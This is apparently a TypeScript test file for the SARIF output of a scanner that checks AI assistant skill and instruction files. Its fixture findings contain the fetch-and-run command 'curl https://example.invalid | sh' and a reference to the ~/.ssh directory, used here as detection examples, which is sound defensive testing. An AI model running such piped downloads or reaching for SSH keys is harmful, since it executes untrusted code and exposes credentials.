import { join, resolve } from "node:path";
import { describe, expect, it } from "vitest";
import type { ScanResult } from "../src/engine/index.js";
import { sarifReport } from "../src/reporters/sarif.js";
import { ALL_RULES } from "../src/rules/index.js";

const root = resolve("/work/repo");
const result: ScanResult = {
  root,
  homeDir: resolve("/home/dev"),
  targets: [],
  findings: [
    {
      ruleId: "SW004",
      severity: "high",
      file: ".claude/skills/x/SKILL.md",
      line: 9,
      column: 3,
      message: "Executes code fetched from the network.",
      snippet: "curl https://example.invalid | sh",
      confidence: "high",
    },
    {
      ruleId: "SW005",
      severity: "medium",
      file: "~/.claude/CLAUDE.md",
      line: 2,
      message: "Mentions the SSH directory.",
      snippet: "Look in ~/.ssh",
      confidence: "low",
    },
  ],
  suppressed: [
    {
      ruleId: "SW004",
      severity: "high",
      file: "docs/my file.md",
      line: 4,
      column: 1,
      message: "m",
      snippet: "s",
      confidence: "high",
      suppression: { ruleIds: ["SW004"], line: 3, reason: "attack example" },
    },
  ],
  skipped: [],
  errors: [{ ruleId: "SW001", path: "CLAUDE.md", message: "boom" }],
};

// eslint-disable-next-line @typescript-eslint/no-explicit-any
const report = sarifReport(result, { cwd: root }) as any;
const run = report.runs[0];

describe("sarif reporter", () => {
  it("is SARIF 2.1.0 with all rules described", () => {
    expect(report.version).toBe("2.1.0");
    expect(run.tool.driver.name).toBe("skillward");
    expect(run.tool.driver.rules.map((r: { id: string }) => r.id)).toEqual(ALL_RULES.map((r) => r.id));
    const sw004 = run.tool.driver.rules.find((r: { id: string }) => r.id === "SW004");
    expect(sw004).toMatchObject({ name: "pipe-to-shell", defaultConfiguration: { level: "error" } });
    expect(sw004.properties["security-severity"]).toBe("8.0");
    expect(run.columnKind).toBe("utf16CodeUnits");
  });

  it("maps findings to results with repo-relative locations", () => {
    const [first] = run.results;
    expect(first).toMatchObject({
      ruleId: "SW004",
      ruleIndex: ALL_RULES.findIndex((r) => r.id === "SW004"),
      level: "error",
      message: { text: "Executes code fetched from the network." },
      properties: { severity: "high", confidence: "high" },
    });
    expect(first.locations[0].physicalLocation).toEqual({
      artifactLocation: { uri: ".claude/skills/x/SKILL.md", uriBaseId: "%SRCROOT%" },
      region: { startLine: 9, startColumn: 3, snippet: { text: "curl https://example.invalid | sh" } },
    });
    expect(first.partialFingerprints["skillward/v1"]).toMatch(/^[0-9a-f]{64}$/);
  });

  it("uses absolute file URIs outside the repository (e.g. ~/.claude)", () => {
    const uri = run.results[1].locations[0].physicalLocation.artifactLocation.uri;
    expect(uri.startsWith("file://")).toBe(true);
    expect(uri.endsWith("/home/dev/.claude/CLAUDE.md")).toBe(true);
    expect(run.results[1].level).toBe("warning");
  });

  it("reports inline suppressions as SARIF suppressions and encodes URIs", () => {
    const suppressed = run.results[2];
    expect(suppressed.suppressions).toEqual([{ kind: "inSource", justification: "attack example" }]);
    expect(suppressed.locations[0].physicalLocation.artifactLocation.uri).toBe("docs/my%20file.md");
  });

  it("records rule failures as tool notifications", () => {
    expect(run.invocations[0].executionSuccessful).toBe(false);
    expect(run.invocations[0].toolExecutionNotifications[0].message.text).toContain("SW001 failed on CLAUDE.md");
    expect(run.originalUriBaseIds["%SRCROOT%"].uri).toBe(new URL(`file:///${join(root, "/").replace(/\\/g, "/").replace(/^\//, "")}`).href);
  });
});
